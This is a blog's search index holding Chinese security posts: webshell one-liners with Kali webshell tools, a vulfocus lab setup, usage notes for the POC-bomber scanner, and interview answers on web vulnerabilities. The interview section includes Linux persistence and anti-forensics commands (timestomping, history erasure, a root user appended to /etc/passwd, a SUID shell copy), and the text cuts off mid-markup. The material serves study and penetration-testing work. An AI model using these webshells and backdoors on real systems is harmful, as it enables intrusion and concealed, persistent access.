<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Kali-WebShell</title>
      <link href="/2022/05/01/2022-05-1-kali-webshell/"/>
      <url>/2022/05/01/2022-05-1-kali-webshell/</url>
      
        <content type="html"><![CDATA[<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>asp一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;%execute(request(&quot;pass&quot;))%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>php一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[pass]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>aspx一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;])%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Kali自带WebShell工具"><a href="#Kali自带WebShell工具" class="headerlink" title="Kali自带WebShell工具"></a>Kali自带WebShell工具</h2><p><strong>注：两款WebShell工具生成的WebShell都是经过加密后</strong></p><h3 id="Webacoo"><a href="#Webacoo" class="headerlink" title="Webacoo"></a>Webacoo</h3><p><strong>1.生成服务器端</strong></p><pre class="line-numbers language-none"><code class="language-none">wenacoo -g -o a.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.上传后用客户端进行连接</strong></p><pre class="line-numbers language-none"><code class="language-none">webacoo -t -u http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Weevely（只支持PHP）"><a href="#Weevely（只支持PHP）" class="headerlink" title="Weevely（只支持PHP）"></a>Weevely（只支持PHP）</h2><pre class="line-numbers language-none"><code class="language-none">用http头进行指令传输隐蔽的类终端PHP Webshell有30多个管理模块执行系统命令、浏览文件系统检查服务器常见配置错误创建正向、反向TCP Shell连接通过目标计算机代理HTTP流量从目标计算机运行端口扫描，渗透内网支持连接密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>1.生成服务器端</strong></p><pre class="line-numbers language-none"><code class="language-none">weevely generate &lt;password&gt; b.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成的文件在 <code>/usr/share/weevely/</code>目录下</p><p><strong>2.连接客户端</strong></p><pre class="line-numbers language-none"><code class="language-none">weevely &lt;URL&gt; &lt;password&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建vulfocus漏洞靶场</title>
      <link href="/2022/04/30/2022-04-30-da-jian-vulfocus-lou-dong-ba-chang/"/>
      <url>/2022/04/30/2022-04-30-da-jian-vulfocus-lou-dong-ba-chang/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建步骤其实不多，主要是光特酿的报错，离谱…太菜了</p><p>里面很多细节没有详细记录，有时间再好好写写</p><p>0：40电脑没电了</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220501004041645.png"></p><h2 id="搭建vulfocus漏洞靶场"><a href="#搭建vulfocus漏洞靶场" class="headerlink" title="搭建vulfocus漏洞靶场"></a>搭建vulfocus漏洞靶场</h2><p>首先准备一台contos7虚拟机</p><p>搭建好之后配置网络</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror aliyun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220430231743124.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220430235319346.png"></p><p>解决：</p><pre class="line-numbers language-none"><code class="language-none">yum clean allyum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220501002209136.png"></p><p>记住image id等会会用</p><p>8a99241c264f</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220501002313688.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220501003801574.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220501004650472.png" alt="image-20220501004650472"></p>]]></content>
      
      
      <categories>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulfocus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POC bomber-用于渗透和红队快速打点的漏洞检测工具</title>
      <link href="/2022/04/12/2022-04-12-poc-bomber-yong-yu-shen-tou-he-hong-dui-kuai-su-da-dian-de-lou-dong-jian-ce-gong-ju/"/>
      <url>/2022/04/12/2022-04-12-poc-bomber-yong-yu-shen-tou-he-hong-dui-kuai-su-da-dian-de-lou-dong-jian-ce-gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="相关地址"><a href="#相关地址" class="headerlink" title="相关地址"></a>相关地址</h2><p><a href="https://github.com/tr0uble-mAker/POC-bomber">https://github.com/tr0uble-mAker/POC-bomber</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><p>POC bomber的poc支持weblogic，tomcat，apache，jboss，nginx，struct2，thinkphp2x3x5x，spring，redis，jenkins，php语言漏洞，shiro，泛微OA，致远OA，通达OA等易受攻击组件的漏洞检测，支持调用dnslog平台检测无回显的rce(包括log4j2的检测)，支持单个目标检测和批量检测，程序采用高并发线程池，支持自定义导入poc&#x2F;exp，并能够生成漏洞报告</p><p>POC bomber默认使用验证模式进行poc的验证，如果在返回结果中看到attack的值为True，可以加参数(–attack)进入攻击模式直接调用exp进行攻击(需要指定poc文件名)，达到一键getshell</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h2><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;tr0uble-mAker&#x2F;POC-bomber.git            cd POC-bomberpip install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a><strong>用法</strong></h2><pre class="line-numbers language-none"><code class="language-none">查看用法: python3 pocbomber.py模式:      获取poc&#x2F;exp信息:   python3 pocbomber.py --show      单目标检测:        python3 pocbomber.py -u http:&#x2F;&#x2F;xxx.xxx.xx      批量检测:          python3 pocbomber.py -f url.txt -o report.txt       指定poc检测:       python3 pocbomber.py -f url.txt --poc&#x3D;&quot;thinkphp2_rce.py&quot;      exp攻击模式:       python3 pocbomber.py -u 目标url --poc&#x3D;&quot;指定poc文件&quot; --attack参数:      -u  --url      目标url      -f  --file     指定目标url文件         -o  --output   指定生成报告的文件(默认不生成报告)      -p  --poc      指定单个或多个poc进行检测, 直接传入poc文件名, 多个poc用(,)分开      -t  --thread   指定线程池最大并发数量(默认300)      --show         展示poc&#x2F;exp详细信息      --attack       使用poc文件中的exp进行攻击      --dnslog       使用dnslog平台检测无回显漏洞(默认不启用dnslog,可在配置文件中启用)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;inc&#x2F;config.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="验证模式"><a href="#验证模式" class="headerlink" title="验证模式"></a><strong>验证模式</strong></h2><pre class="line-numbers language-none"><code class="language-none">python3 pocbomber.py -u http:&#x2F;&#x2F;xxx.xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="攻击模式"><a href="#攻击模式" class="headerlink" title="攻击模式"></a><strong>攻击模式</strong></h2><pre class="line-numbers language-none"><code class="language-none">python3 pocbomber.py -u http:&#x2F;&#x2F;xxx.xxx --poc&#x3D;&quot;thinkphp2_rce.py&quot; --attack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><strong>常见问题</strong></h2><ol><li>程序不安装requirements.txt就可以直接运行，只依赖requests第三方库，其他库安装不上不影响程序运行，但有些poc会不能检测</li><li>Shiro的反序列化漏洞的检测(&#x2F;pocs&#x2F;framework&#x2F;shiro): 依赖python3第三方库 pycryptodome 可以尝试先pip uninstall crypto pycryptodome ，再 pip install pycryptodome，不安装库的话默认检测不出shiro反序列, 安装完库如果检测不成功或者出错请检查 &#x2F;pocs&#x2F;framework&#x2F;shiro&#x2F;ysoserial-0.0.6-SNAPSHOT-all.jar 是否完整的下载</li><li>log4j2命令执行漏洞的检测：需要添加 –dnslog 参数</li><li>无回显漏洞检测默认使用 dnslog.cn 平台且默认关闭, 要开启需前往配置文件将 dnslog_flag 开关置为True</li><li>需要指定一个poc才能调用–attack攻击模式</li></ol>]]></content>
      
      
      <categories>
          
          <category> POC bomber </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC bomber </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网面试题目</title>
      <link href="/2022/04/02/2022-04-02-hu-wang-mian-shi-ti-mu/"/>
      <url>/2022/04/02/2022-04-02-hu-wang-mian-shi-ti-mu/</url>
      
        <content type="html"><![CDATA[<h2 id="1-xss原理？存储型xss如何利用？"><a href="#1-xss原理？存储型xss如何利用？" class="headerlink" title="1.xss原理？存储型xss如何利用？"></a>1.xss原理？存储型xss如何利用？</h2><p>1.XSS（跨站脚本攻击）又叫CSS (Cross Site Script) ，为了区别层叠样式表（CSS）所以叫XSS。它指的是攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。<br>2.一、窃取用户的cookie，登陆用户账号。 二、进行社工钓鱼，如弹出来假的后台页面或者弹一个下载flash的木马页面。 三、配合CSRF漏洞进行蠕虫攻击。</p><h2 id="2-渗透测试流程"><a href="#2-渗透测试流程" class="headerlink" title="2.渗透测试流程"></a>2.渗透测试流程</h2><p>1.明确目标    2.分析风险，获得授权    3.信息收集    4.漏洞探测（手动&amp;自动）    5.漏洞验证    6.信息分析    7.利用漏洞，获取数据    8.信息整理    9.形成报告</p><h2 id="3-入侵排查思路"><a href="#3-入侵排查思路" class="headerlink" title="3.入侵排查思路"></a>3.入侵排查思路</h2><p>文件分析<br>a) 文件日期、新增文件、可疑&#x2F;异常文件、最近使用文件、浏览器下载文件    b) Webshell 排查与分析    c) 核心应用关联目录文件分析<br>进程分析<br>a) 当前活动进程 &amp; 远程连接   b) 启动进程&amp;计划任务   c) 进程工具分析   i. Windows:Pchunter    ii. Linux: Chkrootkit&amp;Rkhunter<br>系统信息<br>a) 环境变量    b) 帐号信息    c) History    d) 系统配置文件<br>日志分析<br>a) 操作系统日志    i. Windows: 事件查看器（eventvwr）    ii. Linux: &#x2F;var&#x2F;log&#x2F;    b) 应用日志分析    i. Access.log    ii. Error.log</p><h2 id="4-weblogic和redis未授权漏洞分别是利用哪个端口"><a href="#4-weblogic和redis未授权漏洞分别是利用哪个端口" class="headerlink" title="4.weblogic和redis未授权漏洞分别是利用哪个端口"></a>4.weblogic和redis未授权漏洞分别是利用哪个端口</h2><p>weblogic是7001，redis是6379.</p><h2 id="5-信息收集都是收集什么"><a href="#5-信息收集都是收集什么" class="headerlink" title="5.信息收集都是收集什么"></a>5.信息收集都是收集什么</h2><p>方式：主动扫描，开放搜索等。<br>开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。<br>基础信息：IP、网段、域名、端口。<br>应用信息：各端口的应用。例如web应用、邮件应用、等等。<br>系统信息：操作系统版本<br>版本信息：所有这些探测到的东西的版本。<br>服务信息：中间件的各类信息，插件信息。<br>人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。以及利用社工库收集管理员的密码信息等。<br>防护信息：试着看能否探测到防护设备。</p><h2 id="6-常见漏洞以及自己的见解，防护手段等"><a href="#6-常见漏洞以及自己的见解，防护手段等" class="headerlink" title="6.常见漏洞以及自己的见解，防护手段等"></a>6.常见漏洞以及自己的见解，防护手段等</h2><h3 id="一、-SQL注入-SQL-Inject-OWASP-TOP1-2017-："><a href="#一、-SQL注入-SQL-Inject-OWASP-TOP1-2017-：" class="headerlink" title="一、 SQL注入(SQL Inject)[OWASP TOP1 2017]："></a>一、 SQL注入(SQL Inject)[OWASP TOP1 2017]：</h3><p> 1.原理：<br> SQL注入就是把SQL命令插入到Web表单然后提交到所在页面请求（查询字符串），从而达到欺骗服务器执行恶意的SQL命令。<br> 它是利用现在已有的应用程序，将SQL语句插入到数据库中执行，执行一些并非按照设计者意图的SQL语句。<br> 2.原因：<br>  根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。<br> 3.危害：<br> 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br> 网页篡改：通过操作数据库对特定网页进行篡改。<br> 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br> 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br> 服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br> 破坏硬盘数据，瘫痪全系统。<br> 4.防御：<br> (1)严格的数据类型<br> (2)字符转义<br> (3)使用预编译语句<br> (4)存储过程</p><h3 id="二、-XSS-Cross-site-Script-OWASP-TOP7-2017"><a href="#二、-XSS-Cross-site-Script-OWASP-TOP7-2017" class="headerlink" title="二、 XSS(Cross-site Script)[OWASP TOP7 2017]"></a>二、 XSS(Cross-site Script)[OWASP TOP7 2017]</h3><p> 原理：<br> 攻击者往Web页面里插入恶意html标签或者javascript代码。<br> 分别是反射型XSS、持久型XSS和DOM XSS<br> 危害：<br> （1）网络钓鱼，盗取各类用户的账号<br> （2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作<br> （3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等<br> （4）强制弹出广告页面，刷流量等<br> （5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂等<br> （6）进行基于大量的客户端攻击，如DDOS攻击<br> （7）结合其它漏洞，如CSRF漏洞。<br> 3.防御：<br> （1）代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。<br> （2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。<br> （3）通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。<br> （4）尽量采用POST 而非GET 提交表单</p><h3 id="三、-上传漏洞"><a href="#三、-上传漏洞" class="headerlink" title="三、 上传漏洞"></a>三、 上传漏洞</h3><p> 原理<br> 文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器，服务器未经任何检验或过滤，从而造成文件的执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。<br> 危害<br> 1)上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。<br> 2)上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);<br> 3)上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。<br> 4)上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br> 防御：<br> （1）文件扩展名服务端白名单校验。<br> （2）文件内容服务端校验。<br> （3）上传文件重命名。<br> （4）隐藏上传文件路径。<br> （5）文件上传的目录设置为不可执行<br> （6）单独设置文件服务器的域名<br> 以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。</p><h3 id="四、-文件解析漏洞"><a href="#四、-文件解析漏洞" class="headerlink" title="四、 文件解析漏洞"></a>四、 文件解析漏洞</h3><p> 1.IIS 6.0解析利用方法有两种<br> （1）目录解析：&#x2F;xx.asp&#x2F;xx.jpg<br> （2）文件解析：wooyun.asp;.jpg<br> 第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br> 第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg会被服务器看成是wooyun.asp<br> 还有IIS6.0 默认的可执行文件除了asp还包含这三种.asa、.cer、.cdx<br> 2.Apache解析漏洞后缀名解析漏洞<br> Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断直到识别。<br> 3.PHP CGI解析漏洞<br> 在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为</p> <?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?><p>‘);?&gt; </p><p>1<br> 的文件，然后访问wooyun.jpg&#x2F;x.php,（x.php不存在）在这个目录下就会生成一句话木马 shell.php。<br> 4.%00截断漏洞<br> 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p><h3 id="五、-CSRF（Cross-Site-Request-Forgery）"><a href="#五、-CSRF（Cross-Site-Request-Forgery）" class="headerlink" title="五、 CSRF（Cross-Site Request Forgery）"></a>五、 CSRF（Cross-Site Request Forgery）</h3><p> 1.原理：<br> CSRF是一种夹持用户在已经登陆的web应用程序上执行非本意的操作的攻击方式。相比于XSS，CSRF是利用了系统对页面浏览器的信任，XSS则利用了系统对用户的信任。</p><p>由上图分析我们可以知道构成CSRF攻击是有条件的：<br> 　　1、客户端必须一个网站并生成cookie凭证存储在浏览器中<br> 2、该cookie没有清除，客户端又tab一个页面进行访问别的网站<br> 2.危害<br> 攻击者利用会话劫持达到自己的目的，比如转账、积分等<br> 3.防御<br> （1） GET、POST的正确使用<br> （2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）<br> （3） Referer Check(HTTP  Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。但服务器并非任何时候都能取到referer、保护客户隐私，不作为预防主要手段)<br> （4） Anti CSRF Token：<br> 为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><h3 id="六、-DDos攻击-分布式拒绝服务-Distributed-Denial-of-service-Attack"><a href="#六、-DDos攻击-分布式拒绝服务-Distributed-Denial-of-service-Attack" class="headerlink" title="六、 DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)"></a>六、 DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)</h3><p> 1.原理<br> 攻击者想办法让目标服务器的磁盘空间、内存、进程、网络带宽等资源被占满，从而导致正常用户无法访问。<br> 攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，无法接收新的请求;二是使用IP欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接。<br> 攻击者是使用傀儡机(俗称“肉鸡”，受病毒木马操控的计算机或服务器)作为攻击平台，通过大量伪装合法的请求占用大量网络资源，以达到使指定目标的网络或服务瘫痪中断。<br> 2.危害：<br> 服务器瘫痪、用户无法正常访问。<br> 3.类型<br> （1）SYN Flood攻击：这种攻击方法是经典最有效的DDoS方法，主要是通过向受害主机发送大量伪造源 IP 和源端口的 SYN 或 ACK  包，导致主机的缓存资源被耗尽或忙于发送回应包而造成拒绝服务，可通杀各种系统的网络服务。这种攻击由于源头都是伪造的，所以追踪起来比较困难。但是，该攻击实施起来有一定难度，需要大量高带宽的僵尸主机。<br> （2）TCP 全连接攻击：这种攻击是为了绕过常规防火墙的检查而设计的。一般情况下，常规防火墙大多对于正常的 TCP  连接是放过的，但是很多网络服务程序能接受的 TCP 连接数是有限的。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的 TCP  连接，直到服务器的内存等资源被耗尽而被拖跨，  从而造成拒绝服务。种攻击的特点是可绕过一般防火墙的防护而达到攻击;缺点是需要找很多僵尸主机，且僵尸主机的IP 是暴露，易被追踪。<br>  （3）刷 Script 脚本攻击：这种攻击是跟服务器建立正常的TCP连接， 并不断的向脚本程序提交查询、  列表等大量耗费数据库资源的调用。一般来说，  提交一个指令对客户端的耗费和带宽的占用是几乎可以忽略的，而服务器为处理此请求却可能要从上万条记录中去查出某个记录，这种处理过程对资源的耗费是非常大。攻击者只需通过代理向目标服务器大量递交查询指令，只需数分钟就会把服务器资源消耗掉而导致拒绝服务。这种攻击的特点是可以完全绕过普通的防火墙防护， 轻松找一些代理就可实施攻击;缺点是对付只有静态页面的网站效果会大打折扣，并且会暴露攻击者的IP地址。<br> 4.防御：<br> （1）采用高性能的网络设备<br> （2）尽量避免NAT的使用（NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间）<br> （3）充足的网络带宽保证<br> （4）升级主机服务器硬件<br> （5）把网站做成静态页面<br> （6）增强操作系统的TCP&#x2F;IP栈<br> （7）安装专业抗DDOS防火墙<br> 附：IP Spoof: 即IP地址欺骗，是一台主机设备冒充另外一台主机的IP地址，与其它设备通信，从而达到某种目的技术。属于IP Spoof类的攻击还有TCP 半连接攻击，也就是SYN Flood攻击</p><h2 id="7-发现客户被传了webshell如何处置"><a href="#7-发现客户被传了webshell如何处置" class="headerlink" title="7.发现客户被传了webshell如何处置"></a>7.发现客户被传了webshell如何处置</h2><p>1.先使用webshell查杀工具进行多次查杀。</p><p>2.通过webshell文件创建时间点去翻看相关日期的访问日志。</p><p>3.通过查看日志进行漏洞分析。</p><p>4.修复相关漏洞。</p><h2 id="8-获得了攻击者的ip如何进行溯源，获取攻击者的个人信息"><a href="#8-获得了攻击者的ip如何进行溯源，获取攻击者的个人信息" class="headerlink" title="8.获得了攻击者的ip如何进行溯源，获取攻击者的个人信息"></a>8.获得了攻击者的ip如何进行溯源，获取攻击者的个人信息</h2><p>通过IP端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息。</p><h2 id="9-有无其他安全产品的使用经验"><a href="#9-有无其他安全产品的使用经验" class="headerlink" title="9.有无其他安全产品的使用经验"></a>9.有无其他安全产品的使用经验</h2><p>根据个人情况回答。 例：使用过中睿、山石网科、360的一些防火墙产品。</p><h2 id="10-如果爆发了0day该如何处理"><a href="#10-如果爆发了0day该如何处理" class="headerlink" title="10.如果爆发了0day该如何处理"></a>10.如果爆发了0day该如何处理</h2><p>进行补丁下载</p><h2 id="11-Linux下权限维持方法"><a href="#11-Linux下权限维持方法" class="headerlink" title="11.Linux下权限维持方法"></a>11.Linux下权限维持方法</h2><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200317155640163-289618331.png"></p><h3 id="0x01-修改文件-x2F-终端属性"><a href="#0x01-修改文件-x2F-终端属性" class="headerlink" title="0x01 修改文件&#x2F;终端属性"></a>0x01 修改文件&#x2F;终端属性</h3><h4 id="1-1-文件创建时间"><a href="#1-1-文件创建时间" class="headerlink" title="1.1 文件创建时间"></a>1.1 文件创建时间</h4><p>如果蓝队根据文件修改时间来判断文件是否为后门，如参考index.php的时间再来看shell.php的时间就可以判断shell.php的生成时间有问题。</p><p>解决方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copytouch -r index.php shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p><h4 id="1-2-文件锁定"><a href="#1-2-文件锁定" class="headerlink" title="1.2 文件锁定"></a>1.2 文件锁定</h4><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copychattr +i evil.php  <span class="token comment">#锁定文件</span><span class="token function">rm</span> -rf evil.php     <span class="token comment">#提示禁止删除</span>lsattr  evil.php    <span class="token comment">#属性查看</span>chattr -i evil.php  <span class="token comment">#解除锁定</span><span class="token function">rm</span> -rf evil.php     <span class="token comment">#彻底删除文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-历史操作命令"><a href="#1-3-历史操作命令" class="headerlink" title="1.3 历史操作命令"></a>1.3 历史操作命令</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token punctuation">[</span>space<span class="token punctuation">]</span>set +o <span class="token function">history</span>  <span class="token comment">#备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token punctuation">[</span>Space<span class="token punctuation">]</span>set -o <span class="token function">history</span>  <span class="token comment">#将环境恢复原状</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyhistory <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"keyword"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyhistory -d <span class="token punctuation">[</span>num<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除大规模历史操作记录，这里，我们只保留前150行：</p><pre class="line-numbers language-dart" data-language="dart"><code class="language-dart"><span class="token class-name">Copysed</span> <span class="token operator">-</span>i <span class="token string">'150,$d'</span> <span class="token punctuation">.</span>bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4-passwd写入"><a href="#1-4-passwd写入" class="headerlink" title="1.4 passwd写入"></a>1.4 passwd写入</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy/etc/passwd 各部分含义：用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的<span class="token environment constant">SHELL</span>Copy/etc/shadow 各部分含义：用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>写入举例：</p><p>1.增加超级用户</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Copy<span class="token variable">$perl</span> -le <span class="token string">'print crypt("momaek","salt")'</span>savbSWc4rx8NY<span class="token variable">$echo</span> <span class="token string">"momaek:savbSWc4rx8NY:hacker:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2.如果系统不允许uid&#x3D;0的用户远程登录，可以增加一个普通用户账号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyecho <span class="token string">"momaek:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500"</span> <span class="token operator">>></span> /etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x02-SUID后门"><a href="#0x02-SUID后门" class="headerlink" title="0x02 SUID后门"></a>0x02 SUID后门</h3><p>当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件：</p><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">Copy1、SUID权限仅对二进制程序有效。 2、执行者对于该程序需要具有x的可执行权限3、本权限仅在执行该程序的过程中有效  4、在执行过程中执行者将具有该程序拥有者的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建suid权限的文件：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Copy<span class="token variable">$cp</span> /bin/bash /tmp/.woot<span class="token variable">$chmod</span> <span class="token number">4755</span> /tmp/.woot<span class="token variable">$ls</span> -al /.woot-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">690668</span> Jul <span class="token number">24</span> <span class="token 